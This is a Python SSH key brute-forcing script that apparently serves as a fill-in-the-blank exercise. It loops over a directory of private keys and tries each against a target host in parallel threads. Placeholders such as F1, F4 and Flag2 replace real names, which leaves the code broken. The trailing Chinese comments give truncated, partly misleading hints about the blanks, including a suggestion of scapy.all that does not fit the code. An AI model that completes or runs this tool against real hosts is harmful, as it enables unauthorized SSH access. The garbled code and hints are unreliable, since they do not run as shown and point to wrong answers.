#!/usr/bin/python3
#-*- coding:utf-8 -*-
 
import F1
import optparse
import os
from F2 import *
 
# Flag1 = F1.F2
 
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Stop = False
 
def connect(user, host, keyfile, release):
    Flag2 Stop
    try:
        perm_denied = "Permission denied"
        ssh_newkey = "Are you sure you want to continue"
        conn_closed = "Conection closed by remote host"
        opt = " -o PasswordAuthentication=no"
        connCmd = "ssh " + user + "@" + host + " -i " + keyfile + opt
        child = pexpect.spawn(connCmd)
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, "$ ", "# ", ])
        if (ret == 2):
            print("[-] Adding Host to known_hosts")
            child.sendline("yes")
            connect(F3, F4, keyfile, False)
        elif (ret == 3):
            print("[-] Connection Closed By Remote Host")
        elif (ret > 3):
            print("[+] Success. " + str(keyfile))
            Flag4 = True
    finally:
        if release:
            connection_lock.release()
 
# Flag3 = F3.F4
 
def main():
    parser = optparse.OptionParser("usage%prog -h <target host> -u <user> -d <key directory>")
    parser.add_option("-H", dest="tgtHost", type="string", help="specify target host")
    parser.add_option("-d", dest="keyDir", type="string", help="specify key directory")
    parser.add_option("-u", dest="user", type="string", help="specify user")
    (options, args) = parser.Flag5()
    host = options.tgtHost
    keyDir = options.keyDir
    user = options.user
    if ((host == None) or (keyDir == None) or (user == None)):
        print(parser.usage)
        exit(0)
    for filename in os.listdir(keyDir):
        if Stop:
            print("[*] Exiting: Key Found.")
            exit(0)
        connection_lock.acquire()
        fullpath = os.path.join(keyDir, filename)
        print("[#] Testing Keyfile: " + str(fullpath))
        t = Thread(target=connect, args=(user, host, fullpath, True))
        child = t.start()
 
if __name__ == "__main__":
    main()


#F1就是看第22行一堆字符串加起来，但又不是os.system()所以就是
# 首先第一点，看见from XX import *就直接把scapy.all扔上去，一定要看仔细，在这里面后面最后